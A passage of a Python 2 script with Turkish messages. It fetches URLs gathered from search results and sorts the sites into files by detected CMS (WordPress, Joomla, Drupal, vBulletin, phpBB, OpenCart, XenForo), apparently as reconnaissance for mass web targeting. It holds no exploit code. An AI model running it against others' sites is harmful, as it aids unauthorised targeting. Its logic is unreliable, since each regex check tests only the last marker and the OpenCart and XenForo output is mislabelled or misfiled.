			print renkler.yesil+"urller.txt dosyasina yazilmistir.\nAyni urller dosyadan silinmistir.\nScript ayirma islemi baslatilmistir."+renkler.beyaz
			urlist= open("urller.txt","r").readlines()
			deli=[]
			deli1=[]
			deli3=[]
			for dexmod in urlist:
				dex=dexmod.replace("\n","")
				deli.append(dex)
			for kar in deli:
				if deli1.count(kar)==0:
					deli1.append(kar)
			urlist= open("urller.txt","w")
			urlist.close()
			for delic in deli1:
				urlist= open("urller.txt","a")
				urlist.write(delic+"\n")
				urlist.close()
			deli=[]
			deli1=[]
			deli3=[]
			urlistt= open("urller.txt","r").readlines()
			for url1 in urlistt:
				url2= url1.replace("\n","")
				print url2
				urld='http://'
				urlt=urld+url2
				print urlt
				gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1) 
				try:
						info = urllib2.urlopen(urlt, context=gcontext,timeout = 10).read()  
						info3 = urllib2.urlopen(urlt, context=gcontext,timeout = 10)
						vc= info3.geturl()
				
						soup= BeautifulSoup(info, "html.parser")
				
						for wp  in soup:
								if re.findall("/wp-content/" and "/wp-includes/" and "xmlrpc.php" , str(wp)):
										print "wp bulundu  = "+ urlt
										p=open("wordpress.txt","a")
										p.write(vc+"\n")
										wordp +=1
										p.close()
								elif re.findall("Joomla! - Open Source Content Management" and "Joomla!" and "/templates/"  , str(wp)):
										print "joomla  ="+ urlt
										p=open("joomla.txt","a")
										p.write(vc+"\n")
										jom +=1
										p.close()
								elif re.findall("Drupal - Open Source CMS" and "Drupal" and "/node/" and "/sites/all/themes/"  , str(wp)):
										print "drupal  ="+ urlt
										p=open("drupal.txt","a")
										p.write(vc+"\n")
										drup+=1
										p.close()
								elif re.findall("vBulletin" and "vbulletin" and "vBulletinÃÂ®"   , str(wp)):
										print "vbulletin  ="+ urlt
										p=open("vbulletin.txt","a")
										p.write(vc+"\n")
										vbull +=1
										p.close()
								elif re.findall("phpBB" and "phpBB Group"  , str(wp)):
										print "phpbb  ="+ urlt
										p=open("phpbb.txt","a")
										p.write(vc+"\n")
										phpb +=1
										p.close()
								elif re.findall("OpenCart" and "index.php?route="  , str(wp)):
										print "OpenCart  ="+ urlt
										p=open("opencart.txt","a")
										p.write(vc+"\n")
										opencard +=1
										p.close()
								elif re.findall("XenForo" and "xenforo"   , str(wp)):
										print "OpenCart  ="+ urlt
										p=open("xenforo.txt","a")
										p.write(vc+"\n")
										xenfor +=1
										p.close()
										
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue


		

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("wordpress.txt","r").readlines()

			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
				print vj
			for i in opp:
				opp1.append(i)
			prc=open("wordpress.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("wordpress.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("joomla.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)

			for i in opp:
				opp1.append(i)
			prc=open("joomla.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("joomla.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("drupal.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			for i in opp:
				opp1.append(i)
			prc=open("drupal.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("drupal.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("vbulletin.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("vbulletin.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("vbulletin.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("phpbb.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("phpbb.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("phpbb.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("opencart.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("opencard.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("opencard.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("xenforo.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("xenforo.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("xenforo.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			print renkler.kirmizi +""" 
			%s tane wordpress sitesi bulundu. \n
			%s tane joomla sitesi bulundu. \n
			%s tane drupal sitesi bulundu. \n
			%s tane vbulletin sitesi bulundu.\n
			%s tane phpbb sitesi bulundu. \n
			%s tane opencard sitesi bulundu. \n
			%s tane xenforo sitesi bulundu. \n
			""" %(wordp,jom,drup,vbull,phpb,opencard,xenfor) +renkler.beyaz
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
	if scriptleriayir != None and ipvedomainreverseip ==None and site   == None and sitelistesi ==None and iparama==None and iplistesi==None and dork ==None and dorklistesi ==None and uzantilar == None and iplisteolusturucu == None and dosyaduzeltici==None:

		baslangic= datetime.datetime.now()
		if ipvedomainreverseip !="":
			dosya=open("joomla.txt","w")
			dosya.close()
			dosya=open("wordpress.txt","w")
			dosya.close()
			dosya=open("drupal.txt","w")
			dosya.close()
			dosya=open("vbulletin.txt","w")
			dosya.close()
			dosya=open("mybb.txt","w")
			dosya.close()
			dosya=open("phpbb.txt","w")
			dosya.close()
			dosya=open("opencart.txt","w")
			dosya.close()
			dosya=open("xenforo.txt","w")
			dosya.close()

			jom=0
			wordp=0
			drup=0
			vbull=0
			phpb=0
			opencard=0
			xenfor=0

		
			v=[]
			vv=[]
			vvv=[]
			vvvv=[]
			sonv=[]
			urlist= open("bing.txt","r").readlines()
			
			deli=[]
			deli1=[]
			deli3=[]
			for delic in urlist:
				k=urlparse(delic)
				k1=k.scheme
				ll=k.netloc
				urld=str(k1)+"://"+str(ll)
				urlist1= open("urller.txt","a")
				urlist1.write(urld+"\n")
				urlist1.close()
			
			urlistt= open("urller.txt","r").readlines()	
			urlist2= open("urller.txt","w")
			urlist2.close()
			for dexmod in urlistt:
				dex=dexmod.replace("\n","")
				deli.append(dex)
			for kar in deli:
				if deli1.count(kar)==0:
					deli1.append(kar)
			for yazs in deli1:
				urlist1= open("urller.txt","a")
				urlist1.write(yazs+"\n")
				urlist1.close()
		
			deli=[]
			deli1=[]
			deli3=[]
			
			urlistr= open("urller.txt","r").readlines()	
			
			for url1 in urlistr:
				url2= url1.replace("\n","")
				print url2
				gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1) 
				try:
						info = urllib2.urlopen(url2, context=gcontext,timeout = 10).read()  
						info3 = urllib2.urlopen(url2, context=gcontext,timeout = 10)
						vc= info3.geturl()
				
						 
				
						 
						if re.findall("/wp-content/" and "/wp-includes/" and "xmlrpc.php" , str(info)):
								print "wp bulundu  = "+ url2
								p=open("wordpress.txt","a")
								p.write(vc+"\n")
								wordp +=1
								p.close()
						elif re.findall("Joomla! - Open Source Content Management" and "Joomla!" and "/templates/"  , str(info)):
								print "joomla  ="+ url2
								p=open("joomla.txt","a")
								p.write(vc+"\n")
								jom +=1
								p.close()
						elif re.findall("Drupal - Open Source CMS" and "Drupal" and "/node/" and "/sites/all/themes/"  , str(info)):
								print "drupal  ="+ url2
								p=open("drupal.txt","a")
								p.write(vc+"\n")
								drup+=1
								p.close()
						elif re.findall("vBulletin" and "vbulletin" and "vBulletin®"   , str(info)):
								print "vbulletin  ="+ url2
								p=open("vbulletin.txt","a")
								p.write(vc+"\n")
								vbull +=1
								p.close()
						elif re.findall("phpBB" and "phpBB Group"  , str(info)):
								print "phpbb  ="+ url2
								p=open("phpbb.txt","a")
								p.write(vc+"\n")
								phpb +=1
								p.close()
						elif re.findall("OpenCart" and "index.php?route="  , str(info)):
								print "OpenCart  ="+ url2
								p=open("opencart.txt","a")
								p.write(vc+"\n")
								opencard +=1
								p.close()
						elif re.findall("XenForo" and "xenforo"   , str(info)):
								print "OpenCart  ="+ url2
								p=open("xenforo.txt","a")
								p.write(vc+"\n")
								xenfor +=1
								p.close()
				except httplib.IncompleteRead:
					print renkler.kirmizi+"IncompleteRead okuma hatasi olustu"+renkler.beyaz
					continue
				except urllib2.URLError:
						print renkler.kirmizi+"baglanmadi url hatasi"+renkler.beyaz
						continue
				except urllib2.HTTPError:
						print renkler.kirmizi+"baglanmadi"+renkler.beyaz
						continue
				except socket.error:
						print renkler.kirmizi+"socket baglanmadi"+renkler.beyaz
						continue
				except httplib.BadStatusLine:
						print renkler.kirmizi+"url baglanti hatasi"+renkler.beyaz
						continue


		

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("wordpress.txt","r").readlines()

			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
				print vj
			for i in opp:
				opp1.append(i)
			prc=open("wordpress.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("wordpress.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("joomla.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)

			for i in opp:
				opp1.append(i)
			prc=open("joomla.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("joomla.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("drupal.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			for i in opp:
				opp1.append(i)
			prc=open("drupal.txt","w")
			prc.close()
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("drupal.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			opp=[]
			opp1=[]
			opp2=[]
			pr=open("vbulletin.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("vbulletin.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("vbulletin.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("phpbb.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("phpbb.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("phpbb.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("opencart.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("opencard.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("opencard.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()
			opp=[]
			opp1=[]
			opp2=[]
			pr=open("xenforo.txt","r").readlines()
			for i in pr:
				vj=i.replace("\n","")
				opp.append(vj)
			prc=open("xenforo.txt","w")
			prc.close()
			for i in opp:
				opp1.append(i)
		
			for i in opp1:
				if opp2.count(i)==0:
						opp2.append(i)

			for ivv in opp2:
				lka=open("xenforo.txt","a")
				lka.write(str(ivv)+"\n")
				lka.close()

			print renkler.kirmizi +""" 
			%s tane wordpress sitesi bulundu. \n
			%s tane joomla sitesi bulundu. \n
			%s tane drupal sitesi bulundu. \n
			%s tane vbulletin sitesi bulundu.\n
			%s tane phpbb sitesi bulundu. \n
			%s tane opencard sitesi bulundu. \n
			%s tane xenforo sitesi bulundu. \n
			""" %(wordp,jom,drup,vbull,phpb,opencard,xenfor) +renkler.beyaz
			bitis= datetime.datetime.now()
			gecen(baslangic,bitis)
#except requests.exceptions.ConnectionError:
#	print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
#	pass
#except requests.exceptions.Timeout:
#	print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi"+renkler.beyaz
#	pass
#except requests.exceptions.TooManyRedirects:
	#print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
	#pass
#except IOError:
	#argparse		print renkler.kirmizi+"belirtilen dosya bulunamadi"+renkler.beyaz
